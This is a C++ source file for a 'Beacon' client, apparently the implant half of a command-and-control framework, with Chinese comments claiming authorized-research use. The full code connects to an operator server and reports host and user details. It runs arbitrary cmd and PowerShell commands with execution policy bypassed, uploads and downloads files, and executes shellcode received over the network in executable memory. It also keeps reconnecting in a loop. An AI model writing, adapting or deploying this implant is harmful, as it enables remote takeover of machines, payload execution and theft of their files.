#include "../include/protocol.h"
#include "../include/crypto.h"
#include "../include/common.h"

#include <iostream>
#include <string>
#include <vector>
#include <cstdint>
#include <cstring>
#include <thread>
#include <chrono>
#include <atomic>
#include <sstream>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/wait.h>
#include <sys/mman.h>
#endif

// ============================================================================
//  Beacon - 远程管理框架客户端
//  仅用于授权的远程运维/安全研究场景
// ============================================================================

using namespace rmf;

// 配置（硬编码，生产环境应通过参数/加密配置传入）
static const char* SERVER_HOST = "127.0.0.1";
static uint16_t SERVER_PORT = 4444;
static std::vector<uint8_t> ENCRYPTION_KEY = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

static uint32_t g_heartbeat_ms = DEFAULT_HEARTBEAT_MS;
static std::atomic<bool> g_running{true};
static std::string g_beacon_id;

// ============================================================================
//  平台相关：Socket 封装
// ============================================================================
#ifdef _WIN32
using SocketType = SOCKET;
constexpr SocketType INVALID_SOCK = INVALID_SOCKET;

static bool InitNetwork() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
}

static void CleanupNetwork() {
    WSACleanup();
}

static void CloseSocket(SocketType s) {
    closesocket(s);
}

static void SleepMs(uint32_t ms) {
    Sleep(ms);
}
#else
using SocketType = int;
constexpr SocketType INVALID_SOCK = -1;

static bool InitNetwork() { return true; }
static void CleanupNetwork() {}
static void CloseSocket(SocketType s) { close(s); }
static void SleepMs(uint32_t ms) { usleep(ms * 1000); }
#endif

// ============================================================================
//  收集系统信息
// ============================================================================
static BeaconInfo CollectSystemInfo() {
    BeaconInfo info;
    info.id = g_beacon_id;
    info.timestamp = GetTimestampMs();

#ifdef _WIN32
    info.pid = GetCurrentProcessId();

    char hostname[256] = {0};
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    info.hostname = hostname;

    char username[256] = {0};
    size = sizeof(username);
    GetUserNameA(username, &size);
    info.username = username;

    OSVERSIONINFOA osvi{};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA(&osvi);
    char osbuf[128];
    snprintf(osbuf, sizeof(osbuf), "Windows %d.%d Build %d",
             osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    info.os_version = osbuf;

    info.ip = "0.0.0.0"; // 由服务端填充
#else
    info.pid = static_cast<uint32_t>(getpid());

    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    info.hostname = hostname;

    const char* user = getenv("USER");
    info.username = user ? user : "unknown";

    info.os_version = "Linux";
    info.ip = "0.0.0.0";
#endif
    return info;
}

// ============================================================================
//  执行命令
// ============================================================================
static std::string ExecCommand(const std::string& cmd) {
    std::string result;
#ifdef _WIN32
    std::string full_cmd = "cmd.exe /c " + cmd + " 2>&1";
#else
    std::string full_cmd = cmd + " 2>&1";
#endif
    FILE* pipe = popen(full_cmd.c_str(), "r");
    if (!pipe) return "[-] 无法执行命令";

    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        result += buffer;
    }
    pclose(pipe);
    return result;
}

// ============================================================================
//  执行 PowerShell
// ============================================================================
static std::string ExecPowerShell(const std::string& script) {
#ifdef _WIN32
    std::string cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"" + script + "\" 2>&1";
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "[-] 无法执行 PowerShell";
    std::string result;
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        result += buffer;
    }
    pclose(pipe);
    return result;
#else
    return "[-] PowerShell 仅在 Windows 上可用";
#endif
}

// ============================================================================
//  获取系统信息（详细）
// ============================================================================
static std::string GetDetailedSysInfo() {
    std::ostringstream ss;
    BeaconInfo info = CollectSystemInfo();
    ss << "Beacon ID:  " << info.id << "\n"
       << "主机名:     " << info.hostname << "\n"
       << "用户名:     " << info.username << "\n"
       << "系统:       " << info.os_version << "\n"
       << "PID:        " << info.pid << "\n";
    return ss.str();
}

// ============================================================================
//  上传文件（写入到目标）
// ============================================================================
static std::string UploadFile(const std::string& args) {
    // args 格式: remote_path|base64_data
    size_t pos = args.find('|');
    if (pos == std::string::npos) return "[-] 参数格式错误";

    std::string remote_path = args.substr(0, pos);
    std::string b64_data = args.substr(pos + 1);
    std::vector<uint8_t> data = Base64Decode(b64_data);

    FILE* f = fopen(remote_path.c_str(), "wb");
    if (!f) return "[-] 无法写入文件: " + remote_path;

    fwrite(data.data(), 1, data.size(), f);
    fclose(f);
    return "[+] 文件已上传: " + remote_path + " (" + std::to_string(data.size()) + " bytes)";
}

// ============================================================================
//  下载文件（从目标读取）
// ============================================================================
static std::string DownloadFile(const std::string& remote_path) {
    FILE* f = fopen(remote_path.c_str(), "rb");
    if (!f) return "[-] 无法打开文件: " + remote_path;

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    std::vector<uint8_t> data(fsize);
    fread(data.data(), 1, fsize, f);
    fclose(f);

    return Base64Encode(data);
}

// ============================================================================
//  执行 Shellcode（安全研究用途）
// ============================================================================
static std::string ExecuteShellcode(const std::string& b64) {
    std::vector<uint8_t> sc = Base64Decode(b64);
    if (sc.empty()) return "[-] Shellcode 解码失败";

#ifdef _WIN32
    void* mem = VirtualAlloc(NULL, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return "[-] VirtualAlloc 失败";

    memcpy(mem, sc.data(), sc.size());
    auto func = reinterpret_cast<void(*)()>(mem);
    func();

    VirtualFree(mem, 0, MEM_RELEASE);
    return "[+] Shellcode 执行完毕";
#else
    void* mem = mmap(NULL, sc.size(), PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) return "[-] mmap 失败";

    memcpy(mem, sc.data(), sc.size());
    auto func = reinterpret_cast<void(*)()>(mem);
    func();

    munmap(mem, sc.size());
    return "[+] Shellcode 执行完毕";
#endif
}

// ============================================================================
//  处理任务
// ============================================================================
static TaskResult HandleTask(const Task& task) {
    TaskResult result;
    result.task_id = task.id;
    result.timestamp = GetTimestampMs();

    switch (task.type) {
        case TaskType::CMD_EXEC:
            result.output = ExecCommand(task.args);
            result.success = true;
            std::cerr << "[DEBUG] CMD: '" << task.args << "' output_len=" << result.output.size() << std::endl;
            break;
        case TaskType::POWERSHELL:
            result.output = ExecPowerShell(task.args);
            result.success = true;
            break;
        case TaskType::SYSINFO:
            result.output = GetDetailedSysInfo();
            result.success = true;
            break;
        case TaskType::SLEEP: {
            uint32_t ms = static_cast<uint32_t>(std::stoul(task.args));
            g_heartbeat_ms = ms;
            result.output = "[+] 心跳间隔已设置为 " + std::to_string(ms) + " ms";
            result.success = true;
            break;
        }
        case TaskType::UPLOAD:
            result.output = UploadFile(task.args);
            result.success = result.output.find("[+]") != std::string::npos;
            break;
        case TaskType::DOWNLOAD:
            result.output = DownloadFile(task.args);
            result.success = !result.output.empty() && result.output[0] != '[';
            break;
        case TaskType::SHELLCODE:
            result.output = ExecuteShellcode(task.args);
            result.success = result.output.find("[+]") != std::string::npos;
            break;
        case TaskType::EXIT:
            result.output = "[+] Beacon 正在退出";
            result.success = true;
            g_running = false;
            break;
        default:
            result.output = "[-] 未知任务类型";
            result.success = false;
            break;
    }
    return result;
}

// ============================================================================
//  连接到服务端
// ============================================================================
static SocketType ConnectToServer() {
    SocketType sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCK) return INVALID_SOCK;

    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    inet_pton(AF_INET, SERVER_HOST, &server_addr.sin_addr);

    if (connect(sock, reinterpret_cast<sockaddr*>(&server_addr), sizeof(server_addr)) < 0) {
        CloseSocket(sock);
        return INVALID_SOCK;
    }
    return sock;
}

// ============================================================================
//  主循环
// ============================================================================
int main(int argc, char* argv[]) {
    // 解析命令行参数
    if (argc >= 3) {
        SERVER_HOST = argv[1];
        SERVER_PORT = static_cast<uint16_t>(std::atoi(argv[2]));
    }
    if (argc >= 4) {
        // 第三个参数为 hex 密钥
        ENCRYPTION_KEY = FromHexString(argv[3]);
    }

    Crypto::SetKey(ENCRYPTION_KEY);
    g_beacon_id = GenerateBeaconId();

    if (!InitNetwork()) {
        std::cerr << "[-] 网络初始化失败\n";
        return 1;
    }

    std::cout << "[*] Beacon ID: " << g_beacon_id << "\n";
    std::cout << "[*] 连接到 " << SERVER_HOST << ":" << SERVER_PORT << "\n";

    // 主循环：连接 -> 注册 -> 心跳/任务
    while (g_running) {
        SocketType sock = ConnectToServer();
        if (sock == INVALID_SOCK) {
            SleepMs(3000); // 连接失败，3 秒后重试
            continue;
        }

        // 发送 HELLO
        BeaconInfo info = CollectSystemInfo();
        std::vector<uint8_t> hello_data = SerializeBeaconInfo(info);
        std::vector<uint8_t> hello_msg = PackMessage(MsgType::HELLO, hello_data, Crypto::GetKey());
        if (!SendMessage(sock, hello_msg)) {
            CloseSocket(sock);
            SleepMs(3000);
            continue;
        }

        std::cout << "[+] 已注册到服务端\n";

        // 心跳循环
        bool connected = true;
        while (g_running && connected) {
            SleepMs(g_heartbeat_ms);

            // 发送心跳
            std::vector<uint8_t> hb_msg = PackMessage(MsgType::HEARTBEAT, {}, Crypto::GetKey());
            if (!SendMessage(sock, hb_msg)) {
                connected = false;
                break;
            }

            // 接收响应（可能是任务或空心跳）
            std::vector<uint8_t> raw = RecvMessage(sock);
            if (raw.empty()) {
                connected = false;
                break;
            }

            auto [type, payload] = UnpackMessage(raw, Crypto::GetKey());

            if (type == MsgType::TASK) {
                Task task = DeserializeTask(payload);
                TaskResult result = HandleTask(task);

                // 回传结果
                std::vector<uint8_t> res_data = SerializeTaskResult(result);
                std::vector<uint8_t> res_msg = PackMessage(MsgType::RESULT, res_data, Crypto::GetKey());
                if (!SendMessage(sock, res_msg)) {
                    connected = false;
                    break;
                }
            }
            // HEARTBEAT 响应则继续循环
        }

        CloseSocket(sock);
        std::cout << "[-] 连接断开，3 秒后重连\n";
        SleepMs(3000);
    }

    CleanupNetwork();
    return 0;
}
